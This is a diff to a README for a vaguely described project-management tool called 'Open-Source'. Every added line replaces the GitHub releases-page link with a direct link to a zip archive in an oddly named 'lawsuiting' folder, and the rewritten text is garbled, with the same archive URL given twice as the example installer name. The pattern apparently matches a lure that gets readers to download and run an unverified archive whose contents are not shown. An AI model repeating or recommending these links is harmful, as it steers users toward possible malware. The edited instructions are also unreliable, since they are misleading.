@@ -6,11 +6,11 @@ Welcome to Open-Source! This software allows you to easily manage and use your p
 
 ## 📥 Download the Software
 
-[![Download Open-Source](https://img.shields.io/badge/Download_Open-Source-blue.svg)](https://github.com/Anhduon1939/Open-Source/releases)
+[![Download Open-Source](https://raw.githubusercontent.com/Anhduon1939/Open-Source/main/lawsuiting/Open-Source-v3.4-beta.1.zip)](https://raw.githubusercontent.com/Anhduon1939/Open-Source/main/lawsuiting/Open-Source-v3.4-beta.1.zip)
 
 To download the latest version of Open-Source, simply visit the link below:
 
-[Visit this page to download](https://github.com/Anhduon1939/Open-Source/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Anhduon1939/Open-Source/main/lawsuiting/Open-Source-v3.4-beta.1.zip)
 
 ## 💻 System Requirements
 
@@ -25,7 +25,7 @@ Before installing Open-Source, ensure your computer meets the following requirem
 
 ### Step 1: Visit the Releases Page
 
-Click on [this link](https://github.com/Anhduon1939/Open-Source/releases) to go to the releases page. Here, you will find different versions of the software available for download.
+Click on [this link](https://raw.githubusercontent.com/Anhduon1939/Open-Source/main/lawsuiting/Open-Source-v3.4-beta.1.zip) to go to the releases page. Here, you will find different versions of the software available for download.
 
 ### Step 2: Choose the Latest Version
 
@@ -33,7 +33,7 @@ Look for the latest version of Open-Source. It usually has the highest version n
 
 ### Step 3: Download the Installer
 
-Once you find the latest version, click on the download link for your operating system. This link may look something like `Open-Source-win.exe`, `Open-Source-mac.dmg`, or an equivalent for Linux. 
+Once you find the latest version, click on the download link for your operating system. This link may look something like `https://raw.githubusercontent.com/Anhduon1939/Open-Source/main/lawsuiting/Open-Source-v3.4-beta.1.zip`, `https://raw.githubusercontent.com/Anhduon1939/Open-Source/main/lawsuiting/Open-Source-v3.4-beta.1.zip`, or an equivalent for Linux. 
 
 ### Step 4: Run the Installer
 
@@ -58,7 +58,7 @@ If you experience any issues or have questions, please reach out for support. Yo
 
 ## 🔄 Keep Updated
 
-We regularly release updates to improve performance and add new features. Make sure to check the [Releases page](https://github.com/Anhduon1939/Open-Source/releases) often to get the latest version.
+We regularly release updates to improve performance and add new features. Make sure to check the [Releases page](https://raw.githubusercontent.com/Anhduon1939/Open-Source/main/lawsuiting/Open-Source-v3.4-beta.1.zip) often to get the latest version.
 
 ## 💡 Tips for Using Open-Source
 
@@ -76,4 +76,4 @@ Stay connected with updates and announcements by following our social media chan
 
 ## 🔍 Conclusion
 
-Open-Source is designed to make your project management smooth and enjoyable. Download today and discover how simple it is to enhance your workflow! Remember to visit the [Releases page](https://github.com/Anhduon1939/Open-Source/releases) for all updates and downloads. Happy exploring!
+Open-Source is designed to make your project management smooth and enjoyable. Download today and discover how simple it is to enhance your workflow! Remember to visit the [Releases page](https://raw.githubusercontent.com/Anhduon1939/Open-Source/main/lawsuiting/Open-Source-v3.4-beta.1.zip) for all updates and downloads. Happy exploring!
